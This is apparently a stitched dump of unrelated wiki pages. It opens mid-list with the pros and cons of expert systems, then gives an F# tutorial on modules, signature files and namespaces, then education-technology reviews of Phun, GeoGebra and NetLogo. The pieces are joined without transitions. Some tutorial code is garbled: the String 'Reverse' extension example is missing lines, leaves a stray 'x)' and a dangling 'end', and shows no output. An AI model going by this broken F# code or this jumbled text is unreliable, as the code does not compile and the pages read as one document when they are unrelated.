#Centralize the decision making process
#Make things more efficient by reducing the time needed to solve problems
#Combine various human expert intelligences
#Reduce the number of human errors
#Provide strategic and comparative advantages that may create problems for competitors
#Look over transactions that human experts may not think of

Disadvantages:
#No common sense used in making decisions
#Lack of creative responses that human experts are capable of
#Not capable of explaining the logic and reasoning behind a decision
#It is not easy to automate complex processes
#There is no flexibility and ability to adapt to changing environments
#Not able to recognize when there is no answer

{{fsharpTitle|Modules and Namespaces}}

'''Modules and Namespaces''' are primarily used for grouping and organizing code.

== Defining Modules ==
No code is required to define a module. If a codefile does not contain a leading &lt;code&gt;namespace&lt;/code&gt; or &lt;code&gt;module&lt;/code&gt; declaration, F# code will implicitly place the code in a module, where the name of the module is the same as the file name with the first letter capitalized.

To access code in another module, simply use &lt;code&gt;.&lt;/code&gt; notation: &lt;code&gt;moduleName.member&lt;/code&gt;. Notice that this notation is similar to the syntax used to access [[F_Sharp_Programming/Classes#Instance_and_Static_Members|static members]] -- this is not a coincidence. F# modules are compiled as classes which only contain static members, values, and type definitions.

Let's create two files:

'''DataStructures.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;
type 'a Stack =
    | EmptyStack
    | StackNode of 'a * 'a Stack

let rec getRange startNum endNum =
    if startNum &gt; endNum then EmptyStack
    else StackNode(startNum, getRange (startNum+1) endNum)&lt;/source&gt;

'''Program.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;
let x =
    DataStructures.StackNode(1,
        DataStructures.StackNode(2,
            DataStructures.StackNode(3, DataStructures.EmptyStack)))
            
let y = DataStructures.getRange 5 10
            
printfn &quot;%A&quot; x
printfn &quot;%A&quot; y&lt;/source&gt;

This program outputs:
&lt;pre&gt;StackNode (1,StackNode (2,StackNode (3,EmptyStack)))
StackNode
  (5,
   StackNode
     (6,StackNode (7,StackNode (8,StackNode (9,StackNode (10,EmptyStack))))))&lt;/pre&gt;

: '''Note:''' Remember, order of compilation matters in F#. Dependencies must come before dependents, so &lt;code&gt;DataStructures.fs&lt;/code&gt; comes before &lt;code&gt;Program.fs&lt;/code&gt; when compiling this program.

Like all modules, we can use the &lt;code&gt;open&lt;/code&gt; keyword to give us access to the methods inside a module without fully qualifying the naming of the method. This allows us to revise &lt;code&gt;Program.fs&lt;/code&gt; as follows:

&lt;source lang=&quot;ocaml&quot;&gt;
open DataStructures

let x = StackNode(1, StackNode(2, StackNode(3, EmptyStack)))
let y = getRange 5 10
            
printfn &quot;%A&quot; x
printfn &quot;%A&quot; y&lt;/source&gt;

=== Submodules ===
Its very easy to create submodules using the &lt;code&gt;module&lt;/code&gt; keyword:

&lt;source lang=&quot;ocaml&quot;&gt;(* DataStructures.fs *)

type 'a Stack =
    | EmptyStack
    | StackNode of 'a * 'a Stack

module StackOps =
    let rec getRange startNum endNum =
        if startNum &gt; endNum then EmptyStack
        else StackNode(startNum, getRange (startNum+1) endNum)&lt;/source&gt;

Since the &lt;code&gt;getRange&lt;/code&gt; method is under another module, the fully qualified name of this method is &lt;code&gt;DataStructures.StackOps.getRange&lt;/code&gt;. We can use it as follows:

&lt;source lang=&quot;ocaml&quot;&gt;(* Program.fs *)

open DataStructures

let x =
    StackNode(1, StackNode(2, StackNode(3, EmptyStack)))
            
let y = StackOps.getRange 5 10
            
printfn &quot;%A&quot; x
printfn &quot;%A&quot; y&lt;/source&gt;

F# allows us to create a module and a type having the same name, for example the following code is perfectly acceptable:
&lt;source lang=&quot;ocaml&quot;&gt;
type 'a Stack =
    | EmptyStack
    | StackNode of 'a * 'a Stack

module Stack =
    let rec getRange startNum endNum =
        if startNum &gt; endNum then EmptyStack
        else StackNode(startNum, getRange (startNum+1) endNum)&lt;/source&gt;

: '''Note:''' Its possible to nest submodules inside other submodules. However, as a general principle, its best to avoid creating complex module hierarchies. Functional programming libraries tend to be very &quot;flat&quot; with nearly all functionality accessible in the first 2 or 3 levels of a hierarchy. This is in contrast to many other OO languages which encourage programmers to create deeply nested class libraries, where functionality might be buried 8 or 10 levels down the hierarchy.

=== Extending Types and Modules ===
F# supports extension methods, which allow programmers to add new static and instance methods to classes and modules without inheriting from them.

'''Extending a Module'''

The [[F_Sharp_Programming/Sequences#The_Seq_Module|&lt;code&gt;Seq&lt;/code&gt; module]] contains several pairs of methods:
* &lt;code&gt;iter&lt;/code&gt;/&lt;code&gt;iteri&lt;/code&gt;
* &lt;code&gt;map&lt;/code&gt;/&lt;code&gt;mapi&lt;/code&gt;

&lt;code&gt;Seq&lt;/code&gt; has a &lt;code&gt;forall&lt;/code&gt; member, but does not have a corresponding &lt;code&gt;foralli&lt;/code&gt; function, which includes the index of each sequence element. We add this missing method to the module simply by creating another module with the same name. For example, using fsi:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; module Seq =
    let foralli f s =
        s
        |&gt; Seq.mapi (fun i x -&gt; i, x)        (* pair item with its index *)
        |&gt; Seq.forall (fun (i, x) -&gt; f i x) (* apply item and index to function *)


let isPalindrome (input : string) =
    input
    |&gt; Seq.take (input.Length / 2)
    |&gt; Seq.foralli (fun i x -&gt; x = input.[input.Length - i - 1]);;

module Seq = begin
  val foralli : (int -&gt; 'a -&gt; bool) -&gt; seq&lt;'a&gt; -&gt; bool
end
val isPalindrome : string -&gt; bool

&gt; isPalindrome &quot;hello&quot;;;
val it : bool = false
&gt; isPalindrome &quot;racecar&quot;;;
val it : bool = true&lt;/source&gt;

'''Extending a Type'''

The &lt;code&gt;[http://msdn.microsoft.com/en-us/library/system.string.aspx System.String]&lt;/code&gt; has many useful methods, but let's say we thought it was missing a few important functions, &lt;code&gt;Reverse&lt;/code&gt; and &lt;code&gt;IsPalindrome&lt;/code&gt;. Since this class is marked as &lt;code&gt;sealed&lt;/code&gt; or &lt;code&gt;NotInheritable&lt;/code&gt;, we can't create a derived version of this class. Instead, we create a module with the new methods we want. Here's an example in fsi which demonstrates how to add new static and instance methods to the &lt;code&gt;String&lt;/code&gt; class:

&lt;source lang=&quot;ocaml&quot;&gt;&gt; module Seq =
    let foralli f s =
        s
        |&gt; Seq.mapi (fun i x -&gt; i, x)        (* pair item with its index *)
        |&gt; Seq.forall (fun (i, x) -&gt; f i x) (* apply item and index to function *)

module StringExtensions =
    type System.String with           
        member this.IsPalindrome =
            this
            |&gt; Seq.take (this.Length / 2)
            |&gt; Seq.foralli (fun i x -&gt; this.[this.Length - i - 1] = x)
    
        static member Reverse(s : string) =
            let chars : char array =
                let temp = Array.zeroCreate s.Length
                let charsToTake = if temp.Length % 2 &lt;&gt; 0 then (temp.Length + 1) / 2 else temp.Length / 2
                    
                s
                |&gt; Seq.take charsToTake

                    temp.[i] &lt;- s.[temp.Length - i - 1]
                    temp.[temp.Length - i - 1] &lt;- x)
                temp
            new System.String(chars)

open StringExtensions;;

end

&gt; System.String.Reverse(&quot;hello world&quot;);;

=== Module Signatures ===
By default, all members in a module are accessible from outside the module. However, a module often contain members which should not be accessible outside itself, such as helper functions. One way to expose only a subset of a module's members is by creating a signature file for that module. (Another way is to apply .Net CLR access modifiers of public, internal, or private to individual declarations).

Signature files have the same name as their corresponding module, but end with a &quot;.fsi&quot; extension (f-sharp interface). Signature files always come before their implementation files, which have a corresponding &quot;.fs&quot; extension. For example:

'''DataStructures.fsi'''
&lt;source lang=&quot;ocaml&quot;&gt;
type 'a stack =
    | EmptyStack
    | StackNode of 'a * 'a stack
    
module Stack =
    val getRange : int -&gt; int -&gt; int stack
    val hd : 'a stack -&gt; 'a
    val tl : 'a stack -&gt; 'a stack
    val fold : ('a -&gt; 'b -&gt; 'a) -&gt; 'a -&gt; 'b stack -&gt; 'a
    val reduce : ('a -&gt; 'a -&gt; 'a) -&gt; 'a stack -&gt; 'a&lt;/source&gt;

'''DataStructures.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;
type 'a stack =
    | EmptyStack
    | StackNode of 'a * 'a stack

module Stack =
    (* helper functions *)
    let internal_head_tail = function
        | EmptyStack -&gt; failwith &quot;Empty stack&quot;
        | StackNode(hd, tail) -&gt; hd, tail
        
    let rec internal_fold_left f acc = function
        | EmptyStack -&gt; acc
        | StackNode(hd, tail) -&gt; internal_fold_left f (f acc hd) tail
    
    (* public functions *)
    let rec getRange startNum endNum =
        if startNum &gt; endNum then EmptyStack
        else StackNode(startNum, getRange (startNum+1) endNum)
            
    let hd s = internal_head_tail s |&gt; fst
    let tl s = internal_head_tail s |&gt; snd
    let fold f seed stack = internal_fold_left f seed stack
    let reduce f stack = internal_fold_left f (hd stack) (tl stack)&lt;/source&gt;

'''Program.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;
open DataStructures

let x = Stack.getRange 1 10
printfn &quot;%A&quot; (Stack.hd x)
printfn &quot;%A&quot; (Stack.tl x)
printfn &quot;%A&quot; (Stack.fold ( * ) 1 x)
printfn &quot;%A&quot; (Stack.reduce ( + ) x)
(* printfn &quot;%A&quot; (Stack.internal_head_tail x) *) (* will not compile *)&lt;/source&gt;
Since &lt;code&gt;Stack.internal_head_tail&lt;/code&gt; is not defined in our interface file, the method is marked &lt;code&gt;private&lt;/code&gt; and no longer accessible outside of the &lt;code&gt;DataStructures&lt;/code&gt; module.

Module signatures are useful to building a code library's skeleton, however they have a few caveats. If you want to expose a class, record, or union in a module through a signature, then the signature file must expose ''all'' of the objects members, records fields, and union's cases. Additionally, the signature of the function defined in the module and it's corresponding signature in the signature file must match ''exactly''. Unlike OCaml, F# does not allow a function in a module with the generic type &lt;code&gt;'a -&gt; 'a -&gt; 'a&lt;/code&gt; to be restricted to &lt;code&gt;int -&gt; int -&gt; int&lt;/code&gt; in the signature file.

== Defining Namespaces ==
A namespace is a hierarchial catergorization of modules, classes, and other namespaces. For example, the &lt;code&gt;[http://msdn.microsoft.com/en-us/library/system.collections.aspx System.Collections]&lt;/code&gt; namespace groups together all of the collections and data structures in the .NET BCL, whereas the &lt;code&gt;[http://msdn.microsoft.com/en-us/library/system.security.cryptography.aspx System.Security.Cryptography]&lt;/code&gt; namespace groups together all classes which provide cryptographic services.

Namespaces are primarily used to avoid name conflicts. For example, let's say we were writing an application incorporated code from several different vendors. If Vendor A and Vendor B both have a class called &lt;code&gt;Collections.Stack&lt;/code&gt;, and we wrote the code &lt;code&gt;let s = new Stack()&lt;/code&gt;, how would the compiler know whether which stack we intended to create? Namespaces can eliminate this ambiguity by adding one more layer of grouping to our code.

Code is grouped under a namespace using the &lt;code&gt;namespace&lt;/code&gt; keyword:

'''DataStructures.fsi'''
&lt;source lang=&quot;ocaml&quot;&gt;
namespace Princess.Collections
    type 'a stack =
        | EmptyStack
        | StackNode of 'a * 'a stack
        
    module Stack =
        val getRange : int -&gt; int -&gt; int stack
        val hd : 'a stack -&gt; 'a
        val tl : 'a stack -&gt; 'a stack
        val fold : ('a -&gt; 'b -&gt; 'a) -&gt; 'a -&gt; 'b stack -&gt; 'a
        val reduce : ('a -&gt; 'a -&gt; 'a) -&gt; 'a stack -&gt; 'a&lt;/source&gt;

'''DataStructures.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;namespace Princess.Collections

    type 'a stack =
        | EmptyStack
        | StackNode of 'a * 'a stack

    module Stack =
        (* helper functions *)
        let internal_head_tail = function
            | EmptyStack -&gt; failwith &quot;Empty stack&quot;
            | StackNode(hd, tail) -&gt; hd, tail
            
        let rec internal_fold_left f acc = function
            | EmptyStack -&gt; acc
            | StackNode(hd, tail) -&gt; internal_fold_left f (f acc hd) tail
        
        (* public functions *)
        let rec getRange startNum endNum =
            if startNum &gt; endNum then EmptyStack
            else StackNode(startNum, getRange (startNum+1) endNum)
                
        let hd s = internal_head_tail s |&gt; fst
        let tl s = internal_head_tail s |&gt; snd
        let fold f seed stack = internal_fold_left f seed stack
        let reduce f stack = internal_fold_left f (hd stack) (tl stack)&lt;/source&gt;

'''Program.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;
open Princess.Collections

let x = Stack.getRange 1 10
printfn &quot;%A&quot; (Stack.hd x)
printfn &quot;%A&quot; (Stack.tl x)
printfn &quot;%A&quot; (Stack.fold ( * ) 1 x)
printfn &quot;%A&quot; (Stack.reduce ( + ) x)&lt;/source&gt;

'''Where is the &lt;code&gt;DataStructures&lt;/code&gt; Module?'''

You may have expected the code in &lt;code&gt;Program.fs&lt;/code&gt; above to open &lt;code&gt;Princess.Collections.DataStructures&lt;/code&gt; rather than &lt;code&gt;Princess.Collections&lt;/code&gt;. According to the [http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785747 F# spec], F# treats ''anonymous implementation files'' (which are files without a leading &lt;code&gt;module&lt;/code&gt; or &lt;code&gt;namespace&lt;/code&gt; declaration) by putting all code in an implicit module which matches the code's filename. Since we have a leading &lt;code&gt;namespace&lt;/code&gt; declaration, F# does not create the implicit module.

.NET does not permit users to create functions or values outside of classes or modules. As a consequence, we cannot write the following code:

&lt;source lang=&quot;ocaml&quot;&gt;namespace Princess.Collections

    type 'a stack =
        | EmptyStack
        | StackNode of 'a * 'a stack
        
    let somefunction() = 12   (* &lt;--- functions not allowed outside modules *)

    (* ... *)&lt;/source&gt;

If we prefer to have a module called &lt;code&gt;DataStructures&lt;/code&gt;, we can write this:

&lt;source lang=&quot;ocaml&quot;&gt;namespace Princess.Collections
    module DataStructures
        type 'a stack =
            | EmptyStack
            | StackNode of 'a * 'a stack
            
        let somefunction() = 12

        (* ... *)&lt;/source&gt;

Or equivalently, we define a module and place it a namespace simultaneously using:

&lt;source lang=&quot;ocaml&quot;&gt;module Princess.Collections.DataStructures
    type 'a stack =
        | EmptyStack
        | StackNode of 'a * 'a stack
        
    let somefunction() = 12

    (* ... *)&lt;/source&gt;

=== Adding to Namespace from Multiple Files ===
Unlike modules and classes, any file can contribute to a namespace. For example:

'''DataStructures.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;
namespace Princess.Collections

    type 'a stack =
        | EmptyStack
        | StackNode of 'a * 'a stack

    module Stack =
        (* helper functions *)
        let internal_head_tail = function
            | EmptyStack -&gt; failwith &quot;Empty stack&quot;
            | StackNode(hd, tail) -&gt; hd, tail
            
        let rec internal_fold_left f acc = function
            | EmptyStack -&gt; acc
            | StackNode(hd, tail) -&gt; internal_fold_left f (f acc hd) tail
        
        (* public functions *)
        let rec getRange startNum endNum =
            if startNum &gt; endNum then EmptyStack
            else StackNode(startNum, getRange (startNum+1) endNum)
                
        let hd s = internal_head_tail s |&gt; fst
        let tl s = internal_head_tail s |&gt; snd
        let fold f seed stack = internal_fold_left f seed stack
        let reduce f stack = internal_fold_left f (hd stack) (tl stack)&lt;/source&gt;

'''MoreDataStructures.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;
namespace Princess.Collections
    
    type 'a tree when 'a :&gt; System.IComparable&lt;'a&gt; =
        | EmptyTree
        | TreeNode of 'a * 'a tree * 'a tree
        
    module Tree =
        let rec insert (x : #System.IComparable&lt;'a&gt;) = function
            | EmptyTree -&gt; TreeNode(x, EmptyTree, EmptyTree)
            | TreeNode(y, l, r) as node -&gt;
                match x.CompareTo(y) with
                | 0 -&gt; node
                | 1 -&gt; TreeNode(y, l, insert x r)
                | -1 -&gt; TreeNode(y, insert x l, r)
                | _ -&gt; failwith &quot;CompareTo returned illegal value&quot;&lt;/source&gt;

Since we have a leading namespace declaration in both files, F# does not create any implicit modules. The &lt;code&gt;'a stack&lt;/code&gt;, &lt;code&gt;'a tree&lt;/code&gt;, &lt;code&gt;Stack&lt;/code&gt;, and &lt;code&gt;Tree&lt;/code&gt; types are all accessible through the &lt;code&gt;Princess.Collections&lt;/code&gt; namespace:

'''Program.fs'''
&lt;source lang=&quot;ocaml&quot;&gt;
open Princess.Collections

let x = Stack.getRange 1 10
let y =
    let rnd = new System.Random()
    [ for a in 1 .. 10 -&gt; rnd.Next(0, 100) ]
    |&gt; Seq.fold (fun acc x -&gt; Tree.insert x acc) EmptyTree
    
printfn &quot;%A&quot; (Stack.hd x)
printfn &quot;%A&quot; (Stack.tl x)
printfn &quot;%A&quot; (Stack.fold ( * ) 1 x)
printfn &quot;%A&quot; (Stack.reduce ( + ) x)
printfn &quot;%A&quot; y&lt;/source&gt;

=== Controlling Class and Module Accessibility ===

Unlike modules, there is no equivalent to a signature file for namespaces. Instead, the visibility of classes and submodules is controlled through standard [http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/spec2.aspx#_Toc207785709 accessibility modifiers]:

&lt;source lang=&quot;ocaml&quot;&gt;
namespace Princess.Collections
    
    type 'a tree when 'a :&gt; System.IComparable&lt;'a&gt; =
        | EmptyTree
        | TreeNode of 'a * 'a tree * 'a tree
        
    (* InvisibleModule is only accessible by classes or
       modules inside the Princess.Collections namespace*)
    module private InvisibleModule =
        let msg = &quot;I'm invisible!&quot;

    module Tree =
        (* InvisibleClass is only accessible by methods
           inside the Tree module *)
        type private InvisibleClass() =
            member x.Msg() = &quot;I'm invisible too!&quot;
    
        let rec insert (x : #System.IComparable&lt;'a&gt;) = function
            | EmptyTree -&gt; TreeNode(x, EmptyTree, EmptyTree)
            | TreeNode(y, l, r) as node -&gt;
                match x.CompareTo(y) with
                | 0 -&gt; node
                | 1 -&gt; TreeNode(y, l, insert x r)
                | -1 -&gt; TreeNode(y, insert x l, r)
                | _ -&gt; failwith &quot;CompareTo returned illegal value&quot;
&lt;/source&gt;

== Does Technology Improve Learning? ==

For over thirty years, educators have developed technology applications to improve student learning, but research has not not identified significant, replicable advantages for students who use technology compared to those who don't. While many studies do report significant learning advantages using technology, they are often small, flawed, or biased studies. In contrast, the results of several major studies suggest that much technology software may not produce significant gains compared with traditional classroom instruction.

== Introduction ==
[[Image:Newtons_cradle_animation_book.gif‎|left|330px]]
[[Image:Balls1.jpg|left|330px]]
Phun was created by Emil Ernerfeldt for his thesis project at Umea University.  It is used to expose students to physics related topics such as engineering, simulation, animation, and art.{{ref|2D physics sandbox}}  

Phun can be a useful tool in classrooms that can be used by teachers and students to create meaningful learning experiences through the study of the laws of physics, but not on a technical, scientific level to which students are accustomed when they are presented with such an academic subject. Phun provides students with &quot;phun&quot; activities in which students engage without really even knowing that they're practicing physics. Phun is transformative in that it encourages the transformation from traditional to more contemporary learning practices by permitting students to learn without having formulas and equations thrown at them and then expecting them to solve problems centered around physics with paper and pencils.  Phun can be applied to not only secondary students to whom physics is usually taught, but also to younger students, to whom basic math and science skills can be introduced.  Phun is constructivist in nature and allows students to actively engage in and &quot;construct&quot; their own knowledge based on their experiences. According to the creators of Phun, this tool is based on the constructionist approach to enable learning. In simple terms, according to Papert and Harel (1999), constructionism is learning by making.

[[Image:Addis Abeba Wood Scaffold (Sam Effron).jpg|right|180px]]  

=== Phun from a Teacher's Point of View ===
Every time I stand in front of my high school, emotional support classroom and teach students who are below grade level how to divide using long division, I struggle to figure out why I'm teaching it and how to teach it in a more meaningful way to my students so that they see and understand the relevance.  When I think about this example, I am reminded of my days in high school and having to sit through the same boring, irrelevant information that had no meaning for me at the time.  If my teachers, both in science and math, could have figured out a better, more engaging way to teach me about math and science, I would have gotten more out of the classes.  With applications, such as Phun, at our finger tips, teachers need to be exposing their students to these exciting, meaningful tools and having them create their own meanings from real-life experiences.

Phun is a great tool to use in the class; however, in order to have better results the use of this application needs to be provided with adequate scaffolding. Teachers need to realize that this application is only a sand box. If meaningful learning is to take place, students need to get involved in realistic tasks that involve collaboration with their peers.

On its own, Phun is simply going to remain in students' memories as part of a superb personal experience using an animation application to explore physics concepts. It is the teacher's responsibility to take this application a step further. Teachers could provide tasks that require active, constructive, intentional, authentic, and cooperative learning processes. Hence, students could actively engage by a meaningful task in which they manipulate objects and parameters of the environment they are working in and observe the results of their manipulations. Students are given the opportunity to reflect on their experiences, and integrate new experiences to their prior knowledge about the world. In addition, they can also establish goals for what they need to learn in order to make sense out of what they observe. In any case, students are actively and willfully trying to achieve a cognitive goal, thinking and learning more because they are fulfilling an intention. The optimum scenario is to see students naturally working together in learning and knowledge-building communities, exploiting each others’ skills and appropriating each other’s knowledge. Even though, the cooperative feature has not been built into the application, there is room to fill this gap with other resources.

=== Phun from a Student's Point of View ===

[[Image:Waiting for Time to Pass.jpg|right|410px]]

I remember being in physics class in high school and having to sit through an extended period of physics right around lunch time.  I would sit there, wait for the instructor to give us some kind of formula to use to figure out problems having to do with gravity, force, mass, etc., and then simply plug in the numbers to compute the answers.  Once I had the formulas I was good to go and got most problems correct.  There was one problem though.  I had no idea really what I was doing and what the formulas, numbers, and answers meant.  I knew I was performing some type of math that had to do with physics and possibly something Isaac Newton formulated.  I didn't have any experiences to which I could relate my formulas, and I really didn't care because the formulas didn't have any relevance to my life.  Right about now I would have really enjoyed being exposed to Phun.  Using Phun in physics would have given me the opportunity to construct my own meaning of at least a basis of what physics is all about, and it would have kept my attention and engaged me more in the learning process.

Even from a graduate student's point of view, the class period during which we talked about and experienced Phun engaged me and made me want to actually learn more about physics and how it relates to the catapults we were making to knock down our brick walls. It is this type of guided instruction that allows for student exploration and inquisition of applications not yet learned.

== Description of Application ==

Phun is an educational, entertaining software for designing and exploring 2D multi-physics simulations in a cartoony fashion. It's long term mission is to bring visual physics based simulation to the masses.

Phun has been created:

• To make physics fun.

• To promote interest in science and technology among youngsters.

• To enable learning using a constructionist approach

• To use fast and stable cutting-edge methods for multi-physics simulation and solvers

• Using a high level of interactivity, simple and efficient interface that encourages creativity and exploration.
 

=== Using the program ===

When the application is loaded, there are three toolbars that appear at the top of the screen. The top bar is the menu bar. Underneath the menu bar is the simulation control bar. The last bar is the tool box which contains 12 tools such as the sketch tool, the brush tool, the box tool, the circle tool and so forth.

In addition, there are a number of mouse controls that are very handy:

1. left mouse button: either draw or move things..depending on which tool you are using
2. right mouse button: normally it's used for rotating, but when you drag the right mouse button on empty space, you can pan
3. middle mouse wheel: scroll to zoom in and out
4. left and right mouse buttons at the same time: pan the view

== Transformative Potential ==

One of the main transformative potentials is that it makes physics fun, which in the real world is difficult to achieve. In addition, it promotes interest in science and technology among kids, youth, students and even adults. Phun is a tool that encourages creativity and exploration, enabling learning using a constructionist approach, pretty much like Netlogo for complex systems.

Using Phun users experience the relevance of basic concepts such as, time, space, conservation of energy and momentum, friction, restitution, viscosity, air resistance, fluid flow, incompressibility (or rather the opposite), mechanisms and constraints.

Furthermore, this tool is free to download from the Internet and can be customized to different languages. It is a great resource to have in schools that have computers but struggle to get teaching and learning resources due to the high cost of science related software.

== Introduction ==
[[File:geogebra circles.jpg|left|thumb|220px|GeoGebra - figure 1]]


''GeoGebra'' is an outstanding technology tool that improves mathematics education.  It is a quality 21st century transformative application that enhances and supplements the traditionally memorization-based study of geometry.  Through simulations, students create concrete representations of geometric theorems instead of abstractly configuring images in the mind.  







=== Relevance to 7-12 Education: The Traditional Geometry Class ===
The conventional classroom study of geometry is based on students' innate trust in their teachers and textbooks which, they assume provide mathematically sound information.  Traditionally, teachers introduce theorems to their students who apply these memorized theorems in proving or disproving given geometric statements.  

=== Relevance to 7-12 Education: The Transformative Geometry Class ===
No longer should students accept the traditional classroom geometry experience as complete! ''GeoGebra'' is an exciting, web-based application that eliminates the unknowns and ideas students previously inherently accepted as truth, and instead allows users to see the big picture by learning geometry through discovery rather than memorization.
With the addition of ''GeoGebra'' in the classroom, students transform from passive classroom observers to active, excited participants!  Meaningful learning occurs as the students manipulate and test data within the ''GeoGebra''{{ref|Jonassen2008}}

== Description of Application ==
''GeoGebra'' located at http://www.geogebra.org is a dynamic software package that encourages students to visualize geometric transformations and observe geometric theorems in real-time.  It is a free, open-source tool that broadens the study of geometry to incorporate algebra and calculus.  ''GeoGebra'' was specially designed by Markus Hohenwarter for middle school and high school students and has won several prestigious awards such as the European Academic Software Award (2002), the Austrian Educational Software Award (2003), and the German Educational Software Award (2004).
''GeoGebra'' is multi-faceted in that it can be used as both a teaching and a learning tool.  Teachers can instruct students by providing step-by-step instructions in order that students may construct certain, preconceived figures and/or shapes.  In contrast, learners may independently build their own geometric creations using the principles of constructivism to generate knowledge.

== Transformative Potential ==
''GeoGebra'' is user-friendly as evidenced by the ease of use by twelve through fourteen-year-old eighth grade students.  What sets this geometry tool apart from other programs is its dynamic link to the algebraic representation of the data, and the manner in which this interconnectivity is presented.  The manner is simple, straightforward, and by no means overwhelming.  ''GeoGebra'' provides a seamless link between the various mathematical sciences: Geometry, algebra, and calculus.
''GeoGebra'' is a free program making it completely accessible to students with a computer with internet access.  It is engaging, responsive, and empowering and will enhance the study of geometry with appropriate integration into the traditional curriculum.  ''GeoGebra'' makes learning geometry fun and promotes the study of mathematics and technology amongst secondary students.  It uses a constructivist approach to learning and encourages exploration, creativity, and learning by doing.

== How It Works ==
Users have three options in creating ''GeoGebra'' files: Menu options, toolbar icons, or manual entry in the input text box displayed at the lower left of the screen.  The menu options include commands such as changing the settings and properties such as point style, language, axes, right angle style, and coordinates; toolbar customization meaning the user can change or remove icons; and additional features such as creating custom tools, saving files, and print preview.
The toolbar icons differ from the menu options in that it focuses solely on the construction of objects such as points, lines, vectors, and polygons.  Toolbar icons contain drop-down boxes with more specific options (see figure 2).  
[[File:geogebra - tool bar.jpg|right|thumb|250px|GeoGebra Toolbar - figure 2]]



For instance, if a user selects the line option, the drop-down menu includes perpendicular line, parallel line, line bisector, angular bisector, tangents, polar or diameter line, and locus.  The toolbar icons are not available from the menu options.
The manual entry box offers users the opportunity to input algebraic versions of geometric figures.  For instance, a user may type in a line in the format y=mx+b, replacing m and b with slope and y-intercept values. Upon completion of the formula, the user slects the &quot;Input&quot; button, and the figure (in this case, a line) appears on the screen.



In figure 3 below, note that each blue point displayed on the screen has its corresponding coordinates displayed numerically in blue font in the algebra window on the left side of the screen.  Likewise, the light blue line has its algebraic representation (also in light blue font) in the algebra window.  Each green line segment in figure 3 has its corresponding length located in the algebra window in green font.  The coordination of the geometric and algebraic representations is easily recognizable due to the color-coding.  


[[File:geogebra_screenshot.jpg|center|thumb|680px|GeoGebra Clown - figure 3]]

The purpose of ''GeoGebra'' is to explore and manipulate relationships between the algebraic and geometric representations of figures.  This allows students to make connections between various courses of study in mathematics and provides a richer, deeper understanding of the mathematical sciences as a result.  In figure 4 below, the table describes how to create simple geometric figures using both the toolbar and the algebra window in order to explore these relationships.  

[[File:geogebra table.jpg|center|thumb|500px|GeoGebra Table - figure 4]]

== Sample Activities ==
•Coordinate Geometry - Students may determine the distance between two points

•Coordinate Geometry - Students may locate the midpoint of a line segment

•Coordinate Geometry - Students may determine if lines are parallel or perpendicular and derive differences and similarities in algebraic representation of these lines.

•Coordinate Geometry - Students may find the slope of a line and manipulate data to change the slope of the line.

•Coordinate Geometry - Students may determining the slope-intercept form of an equation given a line.

•Basic Geometry - Students may determine perimeter and area of given polygons and circles.

•Basic Geometry - Students may discover properties of polygons and circles.

•RECOMMENDATION: Allow students to use ''GeoGebra'' to explore relationship between algebra and geometry through a constructivist approach (rather than providing structured, step-by-step instructions or activities).  The more time students spend using the program in this manner, the greater their understanding of the interconnectivity of mathematics will be.

== '''About NetLogo''' ==
Authored by Uri Wilensky in 1999,{{ref|Wilensky}} NetLogo is multi-agent progamming language and modeling environment for simulating natural and social phenomena.  It is particularly well suited for modeling complex systems evolving over time.  {{ref|Tisue}} NetLogo is designed based on the Logo programming language to be accessible for novices and high powered users alike. It has an extensive library of models across many content areas.

== '''Introduction to NetLogo in the Social Studies and Earth Science Classroom''' ==
NetLogo is a simulation. A simulation is an abstraction or simplification of some real-life situation or process. In simulations, participants usually play a role that involves them in interactions with other people or with elements of the simulated environment.{{ref|Smaldino, et. al}} You can download the program by clicking on the following link: http://ccl.northwestern.edu/netlogo/download.shtml  The following sections describes NetLogo, how NetLogo might be utilized in both Social Studies and Earth Science, how NetLogo is a transformational application and some sample activities of NetLogo. 


== Social Studies ==
Learning about social studies is a complex endeavor, especially when investigating the evolution of societies. It may be very difficult for students to wrap their heads around the enormity of the concept. This is where NetLogo can help in providing a connection and clarification to the complexities of understanding and evaluating social studies. How can students decipher the complexities of social studies? How can past events teach students about the patterns of behavior? 

== Earth Science ==
The study of Earth Science includes the study of the atmosphere, oceans and biosphere, as well as the solid earth.  Understanding these earth systems and the evolution of the planet often involves physics, chemistry and biology, among others. Concepts in these areas are often abstract and difficult for students to visualize.  Because NetLogo is particularly suited to modeling complex systems over time, it offers a unique way to demonstrate various principles in these disciplines.   


== '''Description of Application''' ==
After downloading NetLogo onto your computer, you can start the program and select models that supplement the lesson you are teaching. Prior to activating one of the simulations, there are brief explanations for each simulation. After opening up one of the simulations, a new window surfaces with three tabs: Interface, Information, and Procedure. The Interface page presents the actual visual simulation of the desired program. The interface provides a setup where you can control and set the variables, the speed and provide user comments about the simulation. The Information page provides the logistical support for the simulation. The sections in this page are: What is it(simulation)?, how to use it?, things to notice, things to try, and extending the model. This is the salient part of NetLogo for the teacher because it provides background on how to properly use the simulation and ways to connect the simulation to the class lesson. The Interface page provides the pseudo ''html'' code that runs the simulation. You can change the code to fit your needs, such as changing the colors, symbols, and dimensions for the simulation.

== '''Transformative Potential''' ==
NetLogo is transformational because it provides an avenue for teachers and students to discover authentic and dynamic ways of viewing science, social studies and social concepts through a simulated environment. In order to enhance the transformational potential, educators must relate the simulations from NetLogo to actual class lessons. Simulations are by design active. They are not a spectator sport. Simulations provide realistic practice with feedback in a realistic context. Most simulations include social interaction.{{ref|Smaldino, et. al}} The realistic component is able to provide students with meaningful learning. It is important in all simulation use that the students suggest and justify their predictions. The worst thing that you can do is to provide a procedural list of actions that students should complete in order to get the right answer. Let the students try out several options and fail. When an experiment fails, that is when real meaningful learning begins.{{ref|Jonassen, et. al}} Why? Simply because in order to get the result students desire, they have to analyze and be thoughtful in manipulating the simulation until they achieve the desired outcome. That is the essence of NetLogo.

